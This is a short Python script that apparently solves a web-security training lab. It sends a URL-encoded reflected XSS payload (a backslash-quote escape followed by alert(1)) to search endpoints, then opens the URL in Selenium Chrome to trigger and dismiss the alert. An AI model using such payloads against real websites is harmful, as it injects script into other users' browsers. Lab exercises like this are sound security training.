import pyautogui
import time
import requests
import sys
import webbrowser
from selenium import webdriver

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)


burp_url = sys.argv[1]
xss_1 = burp_url + '/?search=%5C%22-alert%281%29%7D%2F%2F'
xss_2 = burp_url + '/search-results?search=%5C%22-alert%281%29%7D%2F%2F'
#print(xss_1)
#print(xss_2)
requests.get(burp_url + '/resources/js/searchResults.js')
requests.get(xss_1)
requests.get(xss_2)

driver = webdriver.Chrome()
driver.get(xss_1)
time.sleep(3)
pyautogui.press('enter')
time.sleep(3)
driver.quit()
